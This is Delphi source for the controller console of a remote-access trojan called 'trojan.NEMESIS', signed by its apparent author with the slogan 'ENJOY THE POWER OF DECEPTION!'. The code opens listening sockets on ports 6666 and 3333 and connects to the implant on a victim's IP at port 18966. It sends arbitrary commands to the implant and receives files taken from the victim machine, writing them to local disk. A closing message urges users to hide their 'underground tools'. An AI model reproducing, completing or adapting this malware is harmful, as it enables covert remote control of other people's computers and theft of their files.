{
trojan.NEMESIS (THE CONSOLE-SERVER PART)
========================================
TROJAN_NAME        = 'trojan.NEMESIS';
TROJAN_AUTHOR      = 'dr.K@meleon';
TROJAN_AUTHOREMAIL = 'drkameleon@freemail.gr';

ENJOY THE POWER OF DECEPTION!

*Pieces of code written by other authors are marked as "SOURCE DOWNLOADED SEPARATELY"
}

unit Unit1NEMESIS;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Gauges, StdCtrls, ComCtrls, ExtCtrls, ScktComp, WinSock;

const
        _CONNECT = 'connect';
        _IP      = 'ip';
        _EXIT    = 'exit';
        _FIX     = 'fix';

        MAIN_PORT_TO_LISTEN     = 6666;
        TRANSFER_PORT_TO_LISTEN = 3333;

        IP_IDENT      = '@IP';
        COMMAND_IDENT = '@CMD';
        TailleBloc    = 256;
Type
  TIPTrame=Packed Record
    Case ttType:Integer Of                          // ttType précise le type de la trame
                                                    //  =1 quand c'est un nom de fichier
                                                    //  =2 quand c'est un morceau du fichier
    1:(
        ttNomFichier:String[255];                   // Nom du fichier
      );
    2:( ttDebut : Integer;                          // Adresse de début des données dans le fichier
        ttLong  : Integer;                          // Longueur des données envoyées
        ttDatas : Array[0..TailleBloc-1] Of Byte )  // Données envoyées
  End;

  TForm1 = class(TForm)
    Image1: TImage;
    Image2: TImage;
    Console: TRichEdit;
    toTROJAN: TClientSocket;
    fromTROJAN: TServerSocket;
    Timer1: TTimer;
    TransferFromTROJAN: TServerSocket;
    clocktoterminate: TTimer;
    COMMANDLINE: TComboBox;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure ConsoleMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure clickonCOMMAND(Sender: TObject);
    procedure fromTROJANClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure fromTROJANClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure TransferFromTROJANClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure clocktoterminateTimer(Sender: TObject);
    procedure COMMANDLINEKeyPress(Sender: TObject; var Key: Char);
    procedure COMMANDLINEDblClick(Sender: TObject);
    procedure COMMANDLINESelect(Sender: TObject);
    procedure Image1Click(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1                         : TForm1;
  CL                            : integer;
  SERVER_IS_CURRENTLY_RECEIVING : boolean;
  TRANSFERED_FILE               : file;


implementation

{$R *.dfm}

function nextToken(var txt:String;sep:char):String;
var
        index:byte;
        start,finish:byte;
begin
        index:=1;
        while (txt[index]=sep) do inc(index,1);
        start:=index;
        if txt[index]='"' then
        begin
                inc(index,1);
                while (txt[index]<>'"') do inc(index,1);
                finish:=index;
                nextToken:=copy(txt,start+1,finish-start-1);
                delete(txt,1,finish);
        end else
        begin
                while ((index<length(txt)) and (txt[index]<>sep)) do inc(index,1);
                nextToken:=copy(txt,start,index-start);
                delete(txt,1,index);
        end;
end;

function equal(tx1,tx2:string):boolean;
var
        f1,f2:string;
begin
        f1:=uppercase(tx1);
        f2:=uppercase(tx2);
        if (f1=f2) then equal:=true else equal:=false;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
        commandLine.SetFocus;
        Timer1.Enabled:=false;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
        CL:=Console.Lines.add('### trojan.NEMESIS Control Panel');
        CL:=Console.Lines.add('### --------------------------------');
        CL:=Console.Lines.add('### Both this console and the trojan were coded in Borland Delphi 6.0 by dr.K@meleon');
        CL:=Console.Lines.add('### Contact the author at : drkameleon@freemail.gr');
        CL:=Console.Lines.add('### Enjoy the power of deception!'+#13+#13);

        Console.SelAttributes.Color:=clWhite;
        CL:=Console.Lines.add('- specifying local communications'' port...');
        fromTrojan.Port:=MAIN_PORT_TO_LISTEN;
        Console.Lines.Strings[CL]:=Console.Lines.Strings[CL]+'[OK]';
        CL:=Console.Lines.add('- initialising socket...');
        fromTrojan.Open;
        Console.Lines.Strings[CL]:=Console.Lines.Strings[CL]+'[OK]';

        CL:=Console.Lines.add('- specifying local file-transfer port...');
        TransferFromTrojan.Port:=TRANSFER_PORT_TO_LISTEN;
        Console.Lines.Strings[CL]:=Console.Lines.Strings[CL]+'[OK]';
        CL:=Console.Lines.add('- initialising socket...');
        TransferFromTrojan.Open;
        Console.Lines.Strings[CL]:=Console.Lines.Strings[CL]+'[OK]';
        CL:=Console.Lines.add(#13+'### To establish a connection, type : '+ #13+'### connect + <trojan''s_ip_address> + <trojan''s_port>   (trojan''s port is 18966)');
        CL:=Console.Lines.add('### e.g. : connect 127.0.0.1 18966 (for localhost-127.0.0.1 testing)'+#13);
        Console.SelAttributes.Color:=clWhite;
        end;

procedure TForm1.COMMANDLINEKeyPress(Sender: TObject; var Key: Char);
var
        remPort,    err         : integer;
        param1, param2          : string;
        inputLine, command      : string;
        delayer                 : longint;
begin
        if key=#13 then
        begin
                console.SetFocus;
                inputLine:=commandLine.Text+' ';
                command:=nextToken(inputLine,' ');
                if equal(command,_CONNECT) then
                begin
                        param1:=nextToken(inputLine,' ');
                        param2:=nextToken(inputLine,' ');

                        CL:=Console.Lines.add(#13+'- specifying remote IP address...');
                        toTrojan.Host:=param1;
                        Console.Lines.Strings[CL+1]:=Console.Lines.Strings[CL+1]+'[OK]';
                        CL:=Console.Lines.add('- specifying remote port...');
                        val(param2,remPort,err);
                        toTrojan.Port:=remPort;
                        Console.Lines.Strings[CL]:=Console.Lines.Strings[CL]+'[OK]';
                        CL:=Console.Lines.add('- initialising socket...');
                        toTrojan.Open;
                        Console.Lines.Strings[CL]:=Console.Lines.Strings[CL]+'[OK]';
                        CL:=Console.Lines.Add('- establishing communication...');
                        Console.Refresh;
                end

                else if equal(command,_EXIT) then
                begin
                        Console.Lines.add('> '+commandLine.Text);
                        Console.Lines.Add('- terminating session...');
                        clocktoterminate.enabled:=true;
                        Console.Lines.add(#13+'### trojan.NEMESIS Control Panel');
                        Console.Lines.add('### --------------------------------');
                        Console.Lines.add('### Both this console and the trojan were coded in Borland Delphi 6.0 by dr.K@meleon');
                        Console.Lines.add('### Contact the author at : drkameleon@freemail.gr'+#13+#13);
                        Console.Lines.add('### Don''t allow anyone discover your underground tools!');
                        Console.Refresh;
                end

                else if equal(command,_FIX) then
                begin
                        Console.Lines.add('> '+commandLine.Text);
                        closefile(TRANSFERED_FILE);
                        toTrojan.Socket.SendText(COMMAND_IDENT+' '+commandLine.text+' ');
                        Console.Refresh;
                end

                else
                begin
                        Console.Lines.add('> '+commandLine.Text);
                        toTrojan.Socket.SendText(COMMAND_IDENT+' '+commandLine.text+' ');
                        Console.Refresh;
                end;
                Console.Refresh;
                COMMANDLINE.Items.Add(CommandLine.Text);
                commandLine.text:='';
                commandLine.SetFocus;
        end;
        Console.Realign;

end;

procedure TForm1.ConsoleMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
        Console.Color:=clNavy;
        commandLine.Color:=clBlack;
end;

procedure TForm1.clickonCOMMAND(Sender: TObject);
begin
        Console.Color:=clBlack;
        commandLine.Color:=clNavy;
end;

procedure TForm1.fromTROJANClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
begin
        Console.SetFocus;
        Console.SelAttributes.Color:=clYellow;
        Console.Lines.add(socket.ReceiveText);
        Console.SelAttributes.Color:=clWhite;
        Console.SelAttributes.Color:=clWhite;
        Console.Refresh;
        commandLine.SetFocus;
end;

procedure TForm1.fromTROJANClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
        Console.Lines.Strings[CL]:=Console.Lines.Strings[CL]+'[OK]';
        Console.Lines.Add('- connected!'+#13+#13+'### Type ''help'' for a full list of the available commands'+#13+#13);
        console.Refresh;
end;



procedure TForm1.TransferFromTROJANClientRead(Sender: TObject;  { SOURCE DOWNLOADED SEPARATELY }
  Socket: TCustomWinSocket);
var
        Buffer:TIPTrame;
        Erreur:Integer;
        Recus :Integer;
begin
  // C'est ici la partie principale du serveur
  // Cette procédure est appelée à chaque écriture d'un client

  Erreur  :=0;
  Recus   :=Socket.ReceiveLength;    // Longueur reçue ( en octets )

  If Recus<= SizeOf(Buffer)         // On vérifie que la longueur reçue tient dans la trame
                                    // sinon attention au plantage !!!
  Then With Buffer Do Begin
    // Lecture de la trame reçue
    Socket.ReceiveBuf(Buffer,Recus);

    // En fonction du type de la trame on effectue les traitements
    Case ttType Of
      1:Begin
        // C'est une nouvelle demande, on vérifie le nom du fichier
        // La longueur de la trame doit être au minimumu de
        //   4 ( taille de ttType ) + 1 ( longueur de la chaine ttNomFichier ) + Length(ttNomFichier)
        If (Recus>=5)And(Recus>=(5+Length(ttNomFichier)))
        Then Begin
          // La longueur est bonne, on accepte la demande
          // On ferme le fichier précédent au cas ou
          If SERVER_IS_CURRENTLY_RECEIVING Then CloseFile(TRANSFERED_FILE);

          // On ouvre le fichier de réception en écriture
          AssignFile(TRANSFERED_FILE,ExtractFilePath(ParamStr(0))+ttNomFichier);
          Try
            Rewrite(TRANSFERED_FILE,1);
            SERVER_IS_CURRENTLY_RECEIVING:=True;
            Erreur:=0;
          Except
                erreur:=5;
          End;
        End
        Else erreur:=2;

      End;

      2:Begin
        // On reçoit un morceau de fichier
        // La longueur de la trame doit être au minimumu de
        //   4 ( taille de ttType ) + 4 ( taille de ttDebut ) + 4 ( taille de ttLong )
        //    + ttLong ( nombre de données envoyées )
        If (Recus>=12)And(Recus>=(12+ttLong))
        Then Begin
          // Le morceau n'est accepté que si une demande est en cours
          If SERVER_IS_CURRENTLY_RECEIVING
          Then Begin
            // Le morceau n'est accepté que si le début du fichier à déjà été reçu
            If (ttDebut>=0)And(ttDebut<=FileSize(TRANSFERED_FILE))
            Then Begin
              Try
                // Si tout est bon on écrit le morceau dans le fichier
                Seek(TRANSFERED_FILE,ttDebut);
                BlockWrite(TRANSFERED_FILE,ttDatas,ttLong);
                Erreur:=0; 
              Except
                Erreur:=6;
              End;
            End
            Else Erreur:=4;
          End
          Else Erreur:=3;
        End
        Else Erreur:=2;
      End;

    End;
  End
  Else Erreur:=1;

  Socket.SendBuf(Erreur,4);

end;

procedure TForm1.clocktoterminateTimer(Sender: TObject);
begin
        application.Terminate;
end;


procedure TForm1.COMMANDLINEDblClick(Sender: TObject);
begin
        Console.Color:=clBlack;
        commandLine.Color:=clNavy;
end;

procedure TForm1.COMMANDLINESelect(Sender: TObject);
begin
      Console.Color:=clBlack;
        commandLine.Color:=clNavy;
end;

procedure TForm1.Image1Click(Sender: TObject);
begin
        if form1.TransparentColor then form1.TransparentColor:=false
        else form1.TransparentColor:=true;
end;

end.
